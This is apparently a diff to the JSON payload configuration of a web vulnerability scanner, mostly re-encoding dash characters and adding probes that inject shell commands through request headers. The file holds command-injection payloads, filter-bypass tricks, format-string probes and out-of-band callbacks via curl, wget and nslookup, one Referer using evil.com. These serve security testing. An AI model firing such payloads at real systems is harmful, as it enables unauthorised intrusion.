@@ -3,11 +3,11 @@
   "craft_guidance": [
     "1. IDENTIFY OS: Linux (uname, $(), |, ;, &&), Windows (cmd.exe, &, |, ^), embedded (busybox subset). Server header, error messages disambiguate.",
     "2. BREAK OUT OF QUOTES: '$(cmd)' inside single quotes = literal. Use \"$(cmd)\" inside double, or break with ';cmd;'.",
-    "3. SAFE BENIGN PAYLOADS (Rule 5): id, whoami, hostname, $(echo MARKER) \u2014 never `rm`, `shutdown`, `dd`. Verification: `; sleep 5` (timing) or `; curl COLLAB` (Rule 9a).",
+    "3. SAFE BENIGN PAYLOADS (Rule 5): id, whoami, hostname, $(echo MARKER) — never `rm`, `shutdown`, `dd`. Verification: `; sleep 5` (timing) or `; curl COLLAB` (Rule 9a).",
     "4. WHITESPACE BYPASS: ${IFS}, $IFS$9, %09 (tab), <, {ls,/}. Bash brace expansion `{cat,/etc/passwd}`.",
     "5. CHARACTER FILTERS: `;` blocked? Try `|`, `&&`, `||`, newline `%0a`, backtick, `$()`. Slash blocked? `${PATH:0:1}` or `${HOME:0:1}` for `/`.",
-    "6. BLIND DETECTION: timing (`; sleep 5`), DNS Collaborator (`; nslookup COLLAB`), HTTP Collaborator (`; curl COLLAB`). All \u22653 reps to satisfy Q5 timing rule.",
-    "7. DOUBLE-EVAL: input passed to eval-style \u2014 `eval`, `system`, `exec`, `passthru`, `popen`, `subprocess.shell=True`. Stack errors leak the wrapper.",
+    "6. BLIND DETECTION: timing (`; sleep 5`), DNS Collaborator (`; nslookup COLLAB`), HTTP Collaborator (`; curl COLLAB`). All ≥3 reps to satisfy Q5 timing rule.",
+    "7. DOUBLE-EVAL: input passed to eval-style — `eval`, `system`, `exec`, `passthru`, `popen`, `subprocess.shell=True`. Stack errors leak the wrapper.",
     "8. ARGUMENT INJECTION (no shell): `--config=/etc/passwd`, `-oProxyCommand=...` (ssh), `--upload-file` (curl). No metacharacters needed.",
     "9. WIN: %COMSPEC% /c, dir, type C:\\Windows\\win.ini. PowerShell: `; powershell -e <base64>`.",
     "10. DEMONSTRATE with 1-2 benign markers. PoC > destruction."
@@ -36,7 +36,7 @@
       "probes": [
         {
           "payload": "{{baseline}}; echo {{marker}}",
-          "description": "Semicolon command separator injection \u2014 marker in response confirms execution",
+          "description": "Semicolon command separator injection — marker in response confirms execution",
           "matchers": [
             {
               "type": "reflection",
@@ -49,7 +49,7 @@
         },
         {
           "payload": "{{baseline}}| echo {{marker}}",
-          "description": "Pipe command injection \u2014 marker in response confirms execution",
+          "description": "Pipe command injection — marker in response confirms execution",
           "matchers": [
             {
               "type": "reflection",
@@ -62,7 +62,7 @@
         },
         {
           "payload": "{{baseline}}$(echo {{marker}})",
-          "description": "Command substitution injection \u2014 marker in response confirms execution",
+          "description": "Command substitution injection — marker in response confirms execution",
           "matchers": [
             {
               "type": "reflection",
@@ -101,7 +101,7 @@
         },
         {
           "payload": "{{baseline}} && echo {{marker}}",
-          "description": "AND operator command injection \u2014 executes only if baseline succeeds",
+          "description": "AND operator command injection — executes only if baseline succeeds",
           "matchers": [
             {
               "type": "reflection",
@@ -174,7 +174,7 @@
       ]
     },
     "blind_oob": {
-      "description": "Out-of-band blind command injection \u2014 uses curl/wget/nslookup to trigger DNS or HTTP callbacks to Burp Collaborator",
+      "description": "Out-of-band blind command injection — uses curl/wget/nslookup to trigger DNS or HTTP callbacks to Burp Collaborator",
       "tech_match": [
         "Apache",
         "Nginx",
@@ -196,7 +196,7 @@
       "probes": [
         {
           "payload": "{{baseline}}; curl http://{{callback}}",
-          "description": "OOB command injection via curl \u2014 HTTP interaction on collaborator confirms blind RCE",
+          "description": "OOB command injection via curl — HTTP interaction on collaborator confirms blind RCE",
           "matchers": [
             {
               "type": "length_diff",
@@ -209,7 +209,7 @@
         },
         {
           "payload": "{{baseline}}; nslookup {{callback}}",
-          "description": "OOB command injection via nslookup \u2014 DNS interaction on collaborator confirms blind RCE",
+          "description": "OOB command injection via nslookup — DNS interaction on collaborator confirms blind RCE",
           "matchers": [
             {
               "type": "length_diff",
@@ -222,7 +222,7 @@
         },
         {
           "payload": "{{baseline}}| wget http://{{callback}}/ci_test",
-          "description": "OOB command injection via wget \u2014 HTTP GET to collaborator with unique path confirms blind RCE",
+          "description": "OOB command injection via wget — HTTP GET to collaborator with unique path confirms blind RCE",
           "matchers": [
             {
               "type": "length_diff",
@@ -236,7 +236,7 @@
       ]
     },
     "filter_bypass": {
-      "description": "Filter bypass command injection from PayloadsAllTheThings \u2014 IFS, brace expansion, substitution, newline, and reverse string tricks",
+      "description": "Filter bypass command injection from PayloadsAllTheThings — IFS, brace expansion, substitution, newline, and reverse string tricks",
       "tech_match": [
         "Apache",
         "Nginx",
@@ -258,7 +258,7 @@
       "probes": [
         {
           "payload": "{{baseline}}$IFS$9id",
-          "description": "IFS (Internal Field Separator) bypass for space filtering \u2014 $IFS acts as whitespace substitute",
+          "description": "IFS (Internal Field Separator) bypass for space filtering — $IFS acts as whitespace substitute",
           "matchers": [
             {
               "type": "word",
@@ -274,7 +274,7 @@
         },
         {
           "payload": "{{baseline}};{id}",
-          "description": "Brace expansion command injection \u2014 some shells execute {id} as a command group",
+          "description": "Brace expansion command injection — some shells execute {id} as a command group",
           "matchers": [
             {
               "type": "word",
@@ -290,7 +290,7 @@
         },
         {
           "payload": "{{baseline}}$(id)",
-          "description": "Command substitution injection (dollar-paren form) \u2014 output replaces the substitution inline",
+          "description": "Command substitution injection (dollar-paren form) — output replaces the substitution inline",
           "matchers": [
             {
               "type": "word",
@@ -306,7 +306,7 @@
         },
         {
           "payload": "{{baseline}}`id`",
-          "description": "Backtick command substitution \u2014 legacy form, still evaluated in many shells",
+          "description": "Backtick command substitution — legacy form, still evaluated in many shells",
           "matchers": [
             {
               "type": "word",
@@ -322,7 +322,7 @@
         },
         {
           "payload": "{{baseline}}%0aid",
-          "description": "Newline (URL-encoded %0a) as command separator \u2014 bypasses filters checking for ; | & characters only",
+          "description": "Newline (URL-encoded %0a) as command separator — bypasses filters checking for ; | & characters only",
           "matchers": [
             {
               "type": "word",
@@ -338,7 +338,7 @@
         },
         {
           "payload": "{{baseline}}|rev<<<'di'",
-          "description": "Reverse string trick \u2014 'di' reversed is 'id'; bypasses filters matching literal command names",
+          "description": "Reverse string trick — 'di' reversed is 'id'; bypasses filters matching literal command names",
           "matchers": [
             {
               "type": "word",
@@ -355,7 +355,7 @@
       ]
     },
     "format_string": {
-      "description": "WSTG-INPV-13 \u2014 format string injection. Rare in modern web stacks but present in C wrappers, embedded CGI, syslog forwarders, log4j-pre-formatString templates. %s reads stack, %n writes (DoS / memory disclosure).",
+      "description": "WSTG-INPV-13 — format string injection. Rare in modern web stacks but present in C wrappers, embedded CGI, syslog forwarders, log4j-pre-formatString templates. %s reads stack, %n writes (DoS / memory disclosure).",
       "tech_match": [
         "C",
         "CGI",
@@ -375,7 +375,7 @@
       "probes": [
         {
           "payload": "{{baseline}}%s%s%s%s%s%s%s%s",
-          "description": "Format string %s sequence \u2014 vulnerable native code reads stack memory and returns garbage / segfault / hex address in response",
+          "description": "Format string %s sequence — vulnerable native code reads stack memory and returns garbage / segfault / hex address in response",
           "matchers": [
             {
               "type": "regex",
@@ -395,7 +395,7 @@
         },
         {
           "payload": "{{baseline}}%x%x%x%x%x%x%x%x",
-          "description": "Format string %x sequence \u2014 leaks hex stack values, distinct response = format string interpreted",
+          "description": "Format string %x sequence — leaks hex stack values, distinct response = format string interpreted",
           "matchers": [
             {
               "type": "regex",
@@ -412,7 +412,7 @@
         },
         {
           "payload": "{{baseline}}%n",
-          "description": "Format string %n \u2014 write primitive. Crash / 500 indicates native format string sink (very rare modern web, common in embedded/router admin)",
+          "description": "Format string %n — write primitive. Crash / 500 indicates native format string sink (very rare modern web, common in embedded/router admin)",
           "matchers": [
             {
               "type": "status",
@@ -437,6 +437,67 @@
           "severity": "critical",
           "confidence_boost": 55,
           "variables": {}
+        }
+      ]
+    },
+    "header_injection_matrix": {
+      "description": "Command injection via header fuzz. Logs/parsers exec values from User-Agent / Referer / X-Forwarded-For with shell substitution.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "$(id)",
+          "description": "User-Agent containing shell substitution — confirms via uid= reflection",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "uid=\\d+\\("
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {
+            "header_inject": {
+              "User-Agent": "$(id)"
+            },
+            "manual_chain": true
+          }
+        },
+        {
+          "payload": "`id`",
+          "description": "Referer backtick exec",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "uid=\\d+\\("
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {
+            "header_inject": {
+              "Referer": "https://evil.com/`id`"
+            },
+            "manual_chain": true
+          }
+        },
+        {
+          "payload": ";id;",
+          "description": "X-Forwarded-For with command separator — log-parser exec",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "uid=\\d+\\("
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {
+            "header_inject": {
+              "X-Forwarded-For": ";id;"
+            },
+            "manual_chain": true
+          }
         }
       ]
     }
